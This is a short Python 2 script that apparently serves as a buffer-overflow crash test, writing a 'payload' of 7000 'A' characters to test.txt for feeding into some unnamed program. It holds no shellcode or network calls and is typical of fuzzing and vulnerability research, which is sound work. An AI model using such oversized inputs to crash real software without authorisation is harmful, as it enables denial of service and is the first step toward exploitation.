#!/usr/bin/python

import struct

filename = 'test.txt'

payload = "A" * 7000

print "[+] Creating file %s" % filename
with open(filename, 'w') as f:
    f.write(payload)
print "    File created, wrote %d bytes to file" % len(payload)
